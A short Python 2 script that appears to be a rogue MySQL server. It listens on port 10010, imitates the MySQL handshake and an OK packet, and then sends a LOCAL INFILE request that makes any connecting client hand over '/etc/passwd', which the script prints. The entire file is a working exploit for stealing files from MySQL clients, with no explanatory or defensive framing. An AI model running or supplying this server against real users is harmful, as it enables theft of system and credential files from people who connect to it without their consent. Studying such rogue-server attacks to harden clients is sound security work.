import SocketServer
from struct import *
import binascii


def server_greeting():
    protocol = chr(10)  # 10
    version = '5.7.24-0ubuntu0.16.04.1' + '\x00'
    thread_id = chr(9).ljust(4, '\x00')
    salt1 = binascii.unhexlify('5f471e443603237a00')
    server_capabilities = '\xff\xf7'
    server_language = chr(8)
    server_status = '\x02\x00'
    ex_server_capabilites = '\xff\x81'
    plugin_length = chr(21)
    unused = '\x00' * 10
    salt2 = binascii.unhexlify('51716650185a65062572014500')
    plugin = 'mysql_native_password' + '\x00'

    greeting = protocol + version + thread_id + salt1 + server_capabilities + server_language + \
        server_status + ex_server_capabilites + plugin_length + unused + salt2 + plugin

    packet_len = chr(len(greeting)).ljust(3, '\x00')
    packet_num = '\x00'

    return packet_len + packet_num + greeting


def ok_packet():
    ok = ''
    ok += chr(7).ljust(3, '\x00')  # packet length
    ok += chr(2) + '\x00'  # packet number
    ok += '\x00' + '\x00'  # affected rows
    ok += '\x02\x00'  # server status
    ok += '\x00' + '\x00'  # warnings
    return ok


def read_file(filename):
    f = '\xfb' + filename
    packet_len = chr(len(f)).ljust(3, '\x00')
    packet_num = '\x01'
    return packet_len + packet_num + f


class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass


class RSATCPHandler(SocketServer.BaseRequestHandler):
    def handle(self):
        self.request.sendall(server_greeting())
        print self.request.recv(2048).encode('hex')
        self.request.sendall(ok_packet())
        print self.request.recv(2048).encode('hex')
        self.request.sendall(read_file('/etc/passwd'))
        print self.request.recv(2048)[4:]


if __name__ == "__main__":
    HOST, PORT = "0.0.0.0", 10010
    server = ThreadedTCPServer((HOST, PORT), RSATCPHandler)
    server.serve_forever()
